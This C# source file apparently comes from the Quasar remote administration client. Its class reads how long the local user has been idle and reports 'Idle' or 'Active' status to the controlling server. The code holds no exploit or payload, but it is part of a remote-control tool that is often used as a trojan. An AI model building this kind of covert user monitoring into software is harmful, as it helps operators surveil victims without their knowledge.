using Quasar.Client.Helper;
using Quasar.Client.Networking;
using Quasar.Common.Enums;
using Quasar.Common.Messages;
using System;
using System.Threading;

namespace Quasar.Client.User
{
    /// <summary>
    /// Provides user activity detection and sends <see cref="SetUserStatus"/> messages on change.
    /// </summary>
    public class ActivityDetection : IDisposable
    {
        /// <summary>
        /// Stores the last user status to detect changes.
        /// </summary>
        private UserStatus _lastUserStatus;

        /// <summary>
        /// The client to use for communication with the server.
        /// </summary>
        private readonly QuasarClient _client;

        /// <summary>
        /// Create a <see cref="_token"/> and signals cancellation.
        /// </summary>
        private readonly CancellationTokenSource _tokenSource;

        /// <summary>
        /// The token to check for cancellation.
        /// </summary>
        private readonly CancellationToken _token;

        /// <summary>
        /// Initializes a new instance of <see cref="ActivityDetection"/> using the given client.
        /// </summary>
        /// <param name="client">The name of the mutex.</param>
        public ActivityDetection(QuasarClient client)
        {
            _client = client;
            _tokenSource = new CancellationTokenSource();
            _token = _tokenSource.Token;
            client.ClientState += OnClientStateChange;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            // reset user status
            if (connected)
                _lastUserStatus = UserStatus.Active;
        }

        /// <summary>
        /// Starts the user activity detection.
        /// </summary>
        public void Start()
        {
            new Thread(UserActivityThread).Start();
        }

        /// <summary>
        /// Checks for user activity changes sends <see cref="SetUserStatus"/> to the <see cref="_client"/> on change.
        /// </summary>
        private void UserActivityThread()
        {
            try
            {
                if (IsUserIdle())
                {
                    if (_lastUserStatus != UserStatus.Idle)
                    {
                        _lastUserStatus = UserStatus.Idle;
                        _client.Send(new SetUserStatus { Message = _lastUserStatus });
                    }
                }
                else
                {
                    if (_lastUserStatus != UserStatus.Active)
                    {
                        _lastUserStatus = UserStatus.Active;
                        _client.Send(new SetUserStatus { Message = _lastUserStatus });
                    }
                }
            }
            catch (Exception e) when (e is NullReferenceException || e is ObjectDisposedException)
            {
            }
        }

        /// <summary>
        /// Determines whether the user is idle if the last user input was more than 10 minutes ago.
        /// </summary>
        /// <returns><c>True</c> if the user is idle, else <c>false</c>.</returns>
        private bool IsUserIdle()
        {
            var ticks = Environment.TickCount;

            var idleTime = ticks - NativeMethodsHelper.GetLastInputInfoTickCount();

            idleTime = ((idleTime > 0) ? (idleTime / 1000) : 0);

            return (idleTime > 600); // idle for 10 minutes
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this activity detection service.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _tokenSource.Cancel();
                _tokenSource.Dispose();
            }
        }
    }
}
